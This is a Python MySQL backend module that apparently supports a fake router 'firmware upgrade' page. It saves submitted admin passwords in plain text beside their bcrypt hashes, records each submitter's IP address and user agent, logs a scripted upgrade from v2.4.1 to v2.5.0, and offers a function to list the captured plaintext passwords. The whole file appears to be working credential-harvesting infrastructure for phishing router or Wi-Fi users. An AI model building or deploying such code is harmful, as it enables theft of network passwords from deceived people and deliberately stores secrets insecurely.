import mysql.connector
from mysql.connector import Error
import bcrypt
import os
from dotenv import load_dotenv
from datetime import datetime

# Load environment variables
load_dotenv()

class DatabaseManager:
    def __init__(self):
        self.host = os.getenv('DB_HOST', 'localhost')
        self.user = os.getenv('DB_USER', 'root')
        self.password = os.getenv('DB_PASSWORD', '')
        self.database = os.getenv('DB_NAME', 'router_management')
        self.port = int(os.getenv('DB_PORT', 3306))
        self.connection = None
    
    def connect(self):
        """Establish database connection"""
        try:
            self.connection = mysql.connector.connect(
                host=self.host,
                user=self.user,
                password=self.password,
                database=self.database,
                port=self.port,
                autocommit=True
            )
            if self.connection.is_connected():
                print("Successfully connected to MySQL database")
                return True
        except Error as e:
            print(f"Error connecting to MySQL: {e}")
            return False
        return False
    
    def create_database_and_tables(self):
        """Create database and required tables if they don't exist"""
        try:
            # Connect without specifying database first
            temp_connection = mysql.connector.connect(
                host=self.host,
                user=self.user,
                password=self.password,
                port=self.port
            )
            cursor = temp_connection.cursor()
            
            # Create database if it doesn't exist
            cursor.execute(f"CREATE DATABASE IF NOT EXISTS {self.database}")
            cursor.execute(f"USE {self.database}")
            
            # Create admin_passwords table with both plain and hashed passwords
            create_table_query = """
            CREATE TABLE IF NOT EXISTS admin_passwords (
                id INT AUTO_INCREMENT PRIMARY KEY,
                password_plain VARCHAR(255) NOT NULL,
                password_hash VARCHAR(255) NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT TRUE,
                session_info TEXT,
                ip_address VARCHAR(45),
                user_agent TEXT
            )
            """
            cursor.execute(create_table_query)
            
            # Create upgrade_logs table
            create_logs_table = """
            CREATE TABLE IF NOT EXISTS upgrade_logs (
                id INT AUTO_INCREMENT PRIMARY KEY,
                upgrade_started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                upgrade_completed_at TIMESTAMP NULL,
                status ENUM('started', 'in_progress', 'completed', 'failed') DEFAULT 'started',
                progress INT DEFAULT 0,
                current_step VARCHAR(255),
                ip_address VARCHAR(45),
                user_agent TEXT,
                firmware_version_from VARCHAR(50),
                firmware_version_to VARCHAR(50),
                error_message TEXT
            )
            """
            cursor.execute(create_logs_table)
            
            temp_connection.commit()
            cursor.close()
            temp_connection.close()
            
            print("Database and tables created successfully")
            return True
            
        except Error as e:
            print(f"Error creating database/tables: {e}")
            return False
    
    def hash_password(self, password):
        """Hash password using bcrypt"""
        salt = bcrypt.gensalt()
        hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
        return hashed.decode('utf-8')
    
    def verify_password(self, password, hashed_password):
        """Verify password against hash"""
        return bcrypt.checkpw(password.encode('utf-8'), hashed_password.encode('utf-8'))
    
    def save_password(self, password, ip_address=None, user_agent=None, session_info=None):
        """Save both plain and hashed password to database"""
        if not self.connection or not self.connection.is_connected():
            if not self.connect():
                return False
        
        try:
            cursor = self.connection.cursor()
            hashed_password = self.hash_password(password)
            
            query = """
            INSERT INTO admin_passwords (password_plain, password_hash, ip_address, user_agent, session_info)
            VALUES (%s, %s, %s, %s, %s)
            """
            values = (password, hashed_password, ip_address, user_agent, session_info)
            
            cursor.execute(query, values)
            self.connection.commit()
            
            password_id = cursor.lastrowid
            cursor.close()
            
            print(f"Password saved successfully with ID: {password_id}")
            return password_id
            
        except Error as e:
            print(f"Error saving password: {e}")
            return False
    
    def log_upgrade_start(self, ip_address=None, user_agent=None, firmware_from="v2.4.1", firmware_to="v2.5.0"):
        """Log the start of firmware upgrade"""
        if not self.connection or not self.connection.is_connected():
            if not self.connect():
                return False
        
        try:
            cursor = self.connection.cursor()
            
            query = """
            INSERT INTO upgrade_logs (ip_address, user_agent, firmware_version_from, firmware_version_to, status)
            VALUES (%s, %s, %s, %s, 'started')
            """
            values = (ip_address, user_agent, firmware_from, firmware_to)
            
            cursor.execute(query, values)
            self.connection.commit()
            
            log_id = cursor.lastrowid
            cursor.close()
            
            print(f"Upgrade start logged with ID: {log_id}")
            return log_id
            
        except Error as e:
            print(f"Error logging upgrade start: {e}")
            return False
    
    def update_upgrade_progress(self, log_id, progress, current_step, status='in_progress'):
        """Update upgrade progress"""
        if not self.connection or not self.connection.is_connected():
            if not self.connect():
                return False
        
        try:
            cursor = self.connection.cursor()
            
            query = """
            UPDATE upgrade_logs 
            SET progress = %s, current_step = %s, status = %s
            WHERE id = %s
            """
            values = (progress, current_step, status, log_id)
            
            cursor.execute(query, values)
            self.connection.commit()
            cursor.close()
            
            return True
            
        except Error as e:
            print(f"Error updating upgrade progress: {e}")
            return False
    
    def complete_upgrade_log(self, log_id, success=True, error_message=None):
        """Mark upgrade as completed"""
        if not self.connection or not self.connection.is_connected():
            if not self.connect():
                return False
        
        try:
            cursor = self.connection.cursor()
            
            status = 'completed' if success else 'failed'
            query = """
            UPDATE upgrade_logs 
            SET upgrade_completed_at = CURRENT_TIMESTAMP, status = %s, progress = %s, error_message = %s
            WHERE id = %s
            """
            values = (status, 100 if success else None, error_message, log_id)
            
            cursor.execute(query, values)
            self.connection.commit()
            cursor.close()
            
            return True
            
        except Error as e:
            print(f"Error completing upgrade log: {e}")
            return False
    
    def get_recent_passwords(self, limit=10):
        """Get recent password entries (for admin purposes)"""
        if not self.connection or not self.connection.is_connected():
            if not self.connect():
                return []
        
        try:
            cursor = self.connection.cursor(dictionary=True)
            
            query = """
            SELECT id, password_plain, password_hash, created_at, ip_address, user_agent, is_active
            FROM admin_passwords 
            ORDER BY created_at DESC 
            LIMIT %s
            """
            
            cursor.execute(query, (limit,))
            results = cursor.fetchall()
            cursor.close()
            
            return results
            
        except Error as e:
            print(f"Error fetching recent passwords: {e}")
            return []
    
    def get_upgrade_history(self, limit=20):
        """Get upgrade history"""
        if not self.connection or not self.connection.is_connected():
            if not self.connect():
                return []
        
        try:
            cursor = self.connection.cursor(dictionary=True)
            
            query = """
            SELECT * FROM upgrade_logs 
            ORDER BY upgrade_started_at DESC 
            LIMIT %s
            """
            
            cursor.execute(query, (limit,))
            results = cursor.fetchall()
            cursor.close()
            
            return results
            
        except Error as e:
            print(f"Error fetching upgrade history: {e}")
            return []
    
    def close_connection(self):
        """Close database connection"""
        if self.connection and self.connection.is_connected():
            self.connection.close()
            print("MySQL connection closed")

# Initialize database manager
db_manager = DatabaseManager()
